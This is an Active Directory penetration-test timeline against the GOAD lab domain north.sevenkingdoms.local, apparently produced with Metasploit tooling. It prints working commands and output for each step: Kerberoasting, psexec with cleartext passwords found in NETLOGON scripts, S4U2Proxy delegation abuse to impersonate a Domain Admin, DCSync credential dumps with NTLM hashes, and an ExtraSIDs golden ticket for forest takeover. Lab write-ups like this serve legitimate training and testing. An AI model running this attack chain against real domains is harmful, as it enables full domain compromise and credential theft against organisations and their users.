# GOAD Lab Engagement Timeline

**Target:** NORTH.SEVENKINGDOMS.LOCAL
**Date:** 2025-12-17
**Duration:** User → Domain Admin: ~39 min | Domain Admin → Forest: ~5 min

---

## Phase 1: Initial Access & Situational Awareness (11:55 - 11:57)

### 11:55:18 - Session Established
```
Server username: NORTH\jon.snow
Computer: CASTELBLACK
OS: Windows Server 2019 (10.0 Build 17763)
Domain: NORTH
```
**Rationale:** Confirm initial foothold identity and environment

### 11:55:19 - Check Current Privileges
```
Enabled Process Privileges:
- SeChangeNotifyPrivilege
- SeIncreaseWorkingSetPrivilege
```
**Rationale:** Understand what operations are possible without elevation. Result: Standard user privileges only.

### 11:55:26 - Network Interface Enumeration
```
Interface 3: Intel PRO/1000 - 10.50.0.22/24
```
**Rationale:** Identify network position and potential lateral movement targets

### 11:55:34 - Domain Discovery
```
Domain FQDN: north.sevenkingdoms.local
Domain NetBIOS: NORTH
Domain Controller: winterfell.north.sevenkingdoms.local (10.50.0.11)
```
**Rationale:** Identify primary targets (DC) for later attacks

### 11:55:51 - Full User Context
```
User: north\jon.snow (S-1-5-21-2825620776-1928720347-1758113318-1118)
Groups: NORTH\Night Watch, NORTH\Stark, BUILTIN\Users
```
**Rationale:** Understand group memberships that might grant additional access

### 11:56:10 - Local Administrator Enumeration
```cmd
net localgroup administrators
Members:
- Administrator
- NORTH\Domain Admins
- NORTH\jeor.mormont  ← DISCOVERED: Non-DA with local admin
- vagrant
```
**Rationale:** Identify who has local admin - discovered jeor.mormont is local admin on CASTELBLACK

### 11:56:20 - Domain Admin Enumeration
```cmd
net group "Domain Admins" /domain
Members: Administrator, eddard.stark
```
**Rationale:** Identify ultimate targets for impersonation attacks. **Discovered eddard.stark as DA.**

### 11:56:27 - Trust Enumeration
```cmd
nltest /domain_trusts
0: SEVENKINGDOMS sevenkingdoms.local (Forest Tree Root) (withinforest)
1: NORTH north.sevenkingdoms.local (Primary Domain)
```
**Rationale:** Understand trust relationships for potential forest-level attacks later

### 11:56:37 - Active Sessions
```cmd
query user
robb.stark - rdp-tcp#0 - Active 5+ days idle
jon.snow - rdp-tcp#1 - Active (current)
```
**Rationale:** Identify other logged-in users whose credentials might be in memory

---

## Phase 2: Privilege Escalation Attempts (11:56 - 12:00)

### 11:57:02 - Mimikatz Load (as user)
```
Success.
[!] Not running as SYSTEM, execution may fail
```
**Rationale:** Attempt credential extraction - warning indicates limited success expected

### 11:57:08 - getsystem FAILED
```
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy.
Attempted:
- Named Pipe Impersonation (In Memory/Admin) - FAILED
- Named Pipe Impersonation (Dropper/Admin) - FAILED
- Token Duplication (In Memory/Admin) - FAILED
- Named Pipe Impersonation (RPCSS variant) - FAILED
- Named Pipe Impersonation (PrintSpooler variant) - FAILED
- Named Pipe Impersonation (EFSRPC variant) - FAILED
```
**Rationale:** Standard privesc techniques failed. Need alternative path. **PIVOT REQUIRED.**

### 11:57:16 - Token Enumeration
```
Delegation Tokens: NORTH\jon.snow
Impersonation Tokens: None available
```
**Rationale:** Check for stealable tokens - none found, confirms need for credential-based escalation

### 11:57:23 - Local Exploit Suggester
```
[*] Collecting local exploits for x64/windows...
```
**Rationale:** Check for kernel/service exploits - running in background while pursuing other paths

---

## Phase 3: Credential Discovery (11:58 - 12:00)

### 11:58:47 - SPN Enumeration (Kerberoasting Targets)
```cmd
setspn -T north.sevenkingdoms.local -Q */*
Discovered SPNs:
- CN=sansa.stark: HTTP/eyrie.north.sevenkingdoms.local
- CN=jon.snow: CIFS/thewall, HTTP/thewall  ← OUR USER HAS SPNs!
- CN=sql_svc: MSSQLSvc/castelblack:1433
- CN=CASTELBLACK$: HTTP/winterfell
```
**Rationale:** Identify Kerberoastable accounts. **Discovery: jon.snow has SPNs - potential delegation!**

### 11:59:00 - Request TGS for sql_svc (Kerberoasting)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/castelblack:1433'
```
**Rationale:** Obtain service ticket for offline password cracking

### 11:59:24 - Export Kerberos Tickets
```
[+] Kerberos tickets found in the current session.
Exported 8 tickets including:
- krbtgt/NORTH.SEVENKINGDOMS.LOCAL (TGT)
- MSSQLSvc/castelblack:1433 (TGS for cracking)
- cifs/winterfell (service ticket)
```
**Rationale:** Capture tickets for offline analysis and potential pass-the-ticket

### 12:00:02 - AS-REP Roasting Attempt (FAILED)
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
ERROR: Get-ADUser is not recognized
```
**Rationale:** Check for accounts without pre-auth - **RSAT not installed, pivot to native methods**

### 12:00:08 - NETLOGON Share Enumeration
```cmd
dir \\winterfell.north.sevenkingdoms.local\NETLOGON
- script.ps1 (165 bytes)
- secret.ps1 (869 bytes)
```
**Rationale:** Check for credentials in login scripts - **FOUND FILES!**

### 12:00:15 - CREDENTIAL DISCOVERY: script.ps1
```powershell
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
```
**Rationale:** Read script contents. **CRITICAL FIND: Cleartext password for jeor.mormont (local admin from earlier enum!)**

### 12:00:15 - secret.ps1 Analysis
```powershell
$keyData = 177, 252, 228, 64, ...
$secret = "76492d1116743f0423413b16050a5345..."
# T.L.
```
**Rationale:** Encrypted secret for "T.L." - saved for later decryption (potentially tywin.lannister)

---

## Phase 4: SYSTEM Access via Discovered Credentials (12:00 - 12:03)

### 12:00:39 - PSExec with jeor.mormont
```
Module: exploit/windows/smb/psexec
RHOSTS: 10.50.0.22 (CASTELBLACK)
SMBUser: jeor.mormont
SMBPass: _L0ngCl@w_
SMBDomain: NORTH
```
**Rationale:** Use discovered credentials + earlier enumeration showing jeor.mormont is local admin

### 12:00:45 - Session 2 Established
```json
{
  "id": "2",
  "type": "meterpreter",
  "info": "NT AUTHORITY\\SYSTEM @ CASTELBLACK"
}
```
**Rationale:** **SUCCESS - SYSTEM ACCESS ACHIEVED**

### 12:00:52 - Confirm SYSTEM
```
Server username: NT AUTHORITY\SYSTEM
Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege, ...
```
**Rationale:** Full system privileges confirmed - can now dump all credentials

---

## Phase 5: Credential Harvesting from Memory (12:02 - 12:06)

### 12:02:42 - PSExec Session 3 (SYSTEM)
```
Session 3 opened: NT AUTHORITY\SYSTEM @ CASTELBLACK
```
**Rationale:** Fresh SYSTEM session for credential dumping

### 12:03:13 - Re-confirm Domain Admins
```cmd
net group "Domain Admins" /domain
Members: Administrator, eddard.stark
```
**Rationale:** Verify targets before impersonation attack

### 12:03:21 - Verify Local Admins
```cmd
net localgroup administrators
NORTH\jeor.mormont confirmed
```
**Rationale:** Confirm attack path worked as expected

### 12:04:09 - Enumerate Domain Admin Properties
```cmd
net user eddard.stark /domain
Account active: Yes
Password expires: Never
```
**Rationale:** Gather info on impersonation target - **confirm eddard.stark is viable target**

### 12:05:27 - User Description Enumeration
```
Querying all domain users for sensitive info in descriptions...
```
**Rationale:** Check for passwords in AD attributes

### 12:05:38 - CREDENTIAL IN DESCRIPTION FIELD
```cmd
net user samwell.tarly /domain
Comment: Samwell Tarly (Password : Heartsbane)
```
**Rationale:** **DISCOVERED PASSWORD in AD description field!**

---

## Phase 6: Constrained Delegation Discovery (12:08 - 12:24)

### 12:08:04 - Delegation Enumeration Attempt (FAILED)
```powershell
Get-ADComputer CASTELBLACK -Properties msDS-AllowedToDelegateTo
ERROR: Get-ADComputer is not recognized
```
**Rationale:** RSAT not available - **PIVOT to alternative method**

### 12:08:24 - Load Kiwi on SYSTEM Session
```
Loading extension kiwi...
```
**Rationale:** Prepare for credential extraction and ticket manipulation

### 12:08:39 - Mimikatz tgs Module (FAILED)
```
ERROR mimikatz_doLocal ; "tgs" module not found !
```
**Rationale:** Attempted direct S4U - module doesn't exist. **PIVOT to Metasploit Kerberos modules**

### 12:08:45 - Mimikatz s4u Command (FAILED)
```
ERROR mimikatz_doLocal ; "s4u" command of "kerberos" module not found !
```
**Rationale:** Confirmed mimikatz can't do S4U directly. **Must use MSF auxiliary modules**

### 12:09:18 - DCSync Attempt (FAILED - No Privileges)
```
lsadump::dcsync /domain:north.sevenkingdoms.local /user:Administrator
ERROR kull_m_rpc_drsr_CrackName ; CrackNames: ERROR_NOT_UNIQUE
```
**Rationale:** Attempted DCSync as SYSTEM - ambiguous username error

### 12:09:25 - DCSync with Domain Prefix (FAILED - Access Denied)
```
lsadump::dcsync /user:NORTH\Administrator
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```
**Rationale:** SYSTEM on workstation can't DCSync - need Domain Admin token. **Confirms need for delegation attack**

### 12:22:57 - Verify jon.snow Credentials
```
[+] Success: 'NORTH\jon.snow:iknownothing'
```
**Rationale:** Confirmed Kerberoasted password - needed for S4U attack

### 12:23:51 - DELEGATION DISCOVERY
```
jon.snow: CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
CASTELBLACK$: HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
```
**Rationale:** **CRITICAL: jon.snow has constrained delegation to DC's CIFS service!**

---

## Phase 7: S4U2Proxy Attack (12:24 - 12:29)

### 12:24:50 - Search for Kerberos Modules
```
msf_module_search: "kerberos"
Found: auxiliary/admin/kerberos/get_ticket
```
**Rationale:** Find alternative to mimikatz S4U - **Discovered MSF Kerberos module**

### 12:25:29 - Configure S4U Attack
```
ACTION => GET_TGS
DOMAIN => north.sevenkingdoms.local
USERNAME => jon.snow
PASSWORD => iknownothing
SPN => CIFS/winterfell.north.sevenkingdoms.local
IMPERSONATE => administrator
```
**Rationale:** Set up constrained delegation abuse to impersonate DA

### 12:26:02 - S4U Request (First Attempt)
```
[+] Received a valid TGT-Response
[*] Getting TGS impersonating administrator@north.sevenkingdoms.local
[+] Received a valid TGS-Response
[*] TGS saved to /home/tuomo/.msf4/loot/...
```
**Rationale:** S4U2Self + S4U2Proxy successful - have impersonated ticket

### 12:27:00 - Use Ticket for PSExec (FAILED)
```
[-] Failed to load a usable credential from ticket file
```
**Rationale:** Ticket for "administrator" not working - **PIVOT to different DA**

### 12:28:30 - S4U with eddard.stark (PIVOT)
```
IMPERSONATE => eddard.stark
[+] Received a valid TGS-Response
```
**Rationale:** Changed target based on earlier DA enumeration - **using discovered DA from Phase 1**

---

## Phase 8: DCSync - Domain Admin Achieved (12:30 - 12:34)

### 12:30:32 - Search for Secrets Dump
```
msf_module_search: "secrets"
Found: auxiliary/gather/windows_secrets_dump
```
**Rationale:** Find DCSync-capable module

### 12:31:24 - DCSync via Kerberos Auth
```
SMB::Auth => kerberos
SMB::Krb5Ccname => [eddard.stark impersonation ticket]
DomainControllerRhost => 10.50.0.11
ACTION => DOMAIN
```
**Rationale:** Use impersonated DA ticket for DCSync

### 12:34:01 - DCSYNC SUCCESS - DOMAIN ADMIN ACHIEVED
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[*] SID enumeration progress - 19 / 19 (100%)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e3e8bc543cc3da2285e6a0a4a2934d08
eddard.stark, arya.stark, catelyn.stark, robb.stark, sansa.stark...
```
**Rationale:** **ALL DOMAIN CREDENTIALS EXTRACTED - DOMAIN ADMIN ACHIEVED**

---

## Phase 9: Forest Dominance (15:04 - 15:09)

*[Session resumed after break]*

### 15:04:12 - New Session on CASTELBLACK
```
Meterpreter session 3 opened as NORTH\jon.snow
```
**Rationale:** Re-establish foothold for forest attack

### 15:05:xx - Forest Trust Confirmation
```cmd
nltest /domain_trusts
SEVENKINGDOMS (Forest Tree Root) ← TARGET
NORTH (Primary Domain) - child domain
```
**Rationale:** Confirm forest structure for ExtraSIDs attack

### 15:06:xx - Collect Domain SIDs
```
NORTH SID: S-1-5-21-2825620776-1928720347-1758113318
SEVENKINGDOMS SID: S-1-5-21-320294251-1534116053-1819042690
Enterprise Admins: S-1-5-21-320294251-1534116053-1819042690-519
```
**Rationale:** Need SIDs for Golden Ticket with ExtraSIDs

### 15:06:58 - Golden Ticket with ExtraSIDs
```
kerberos::golden /user:Administrator
  /domain:north.sevenkingdoms.local
  /sid:S-1-5-21-2825620776-1928720347-1758113318
  /krbtgt:e3e8bc543cc3da2285e6a0a4a2934d08
  /sids:S-1-5-21-320294251-1534116053-1819042690-519
  /ptt

Extra SIDs: S-1-5-21-320294251-1534116053-1819042690-519 (Enterprise Admins)
Golden ticket successfully submitted for current session
```
**Rationale:** Forge ticket with Enterprise Admins SID from parent domain

### 15:07:xx - Forest Root DC Access
```cmd
dir \\kingslanding.sevenkingdoms.local\c$
Directory listing successful - ADMIN ACCESS CONFIRMED
```
**Rationale:** **FOREST ROOT ACCESS ACHIEVED**

### 15:09:11 - DCSync Forest Root Administrator
```
lsadump::dcsync /domain:sevenkingdoms.local /user:SEVENKINGDOMS\Administrator
Hash NTLM: c66d72021a2d4744409969a581a1705e
```
**Rationale:** Extract forest root admin credentials

### 15:09:17 - DCSync Forest Root krbtgt
```
lsadump::dcsync /domain:sevenkingdoms.local /user:SEVENKINGDOMS\krbtgt
Hash NTLM: 34093422b0136ce5f8a0caea867d4d77
```
**Rationale:** **FOREST KRBTGT OBTAINED - COMPLETE FOREST DOMINANCE**

---

## Attack Path Summary

```
jon.snow (standard user)
    │
    ├─[ENUM]─► Discovered jeor.mormont is local admin
    ├─[ENUM]─► Found jeor.mormont password in NETLOGON script
    │
    ▼
jeor.mormont (local admin)
    │
    ├─[PSEXEC]─► NT AUTHORITY\SYSTEM on CASTELBLACK
    │
    ▼
SYSTEM
    │
    ├─[KERBEROAST]─► Cracked jon.snow password: iknownothing
    ├─[ENUM]─► Discovered jon.snow has delegation to CIFS/winterfell
    ├─[ENUM]─► Discovered eddard.stark is Domain Admin
    │
    ▼
S4U2Proxy Attack (impersonate eddard.stark)
    │
    ├─[DCSYNC]─► All NORTH domain credentials including krbtgt
    │
    ▼
Domain Admin (NORTH)
    │
    ├─[ENUM]─► Collected SEVENKINGDOMS domain SID
    ├─[GOLDEN TICKET]─► Forged with Enterprise Admins ExtraSID
    │
    ▼
Enterprise Admin (SEVENKINGDOMS Forest)
    │
    ├─[DCSYNC]─► Forest root krbtgt and all credentials
    │
    ▼
FOREST DOMINANCE ACHIEVED
```

---

## Key Pivots Based on Enumeration

| Situation | Failed Approach | Discovery | Pivot |
|-----------|-----------------|-----------|-------|
| Need SYSTEM | getsystem (all methods failed) | jeor.mormont is local admin + password in NETLOGON | PSExec with discovered creds |
| Need S4U attack | mimikatz kerberos::s4u (module doesn't exist) | Searched MSF modules | auxiliary/admin/kerberos/get_ticket |
| Impersonate DA | administrator (ticket failed) | Earlier enum showed eddard.stark is DA | Changed IMPERSONATE target |
| AD enumeration | Get-ADUser/Get-ADComputer (RSAT not installed) | N/A | Used native net commands + LDAP |

---

*Timeline generated from Metasploit MCP engagement database*
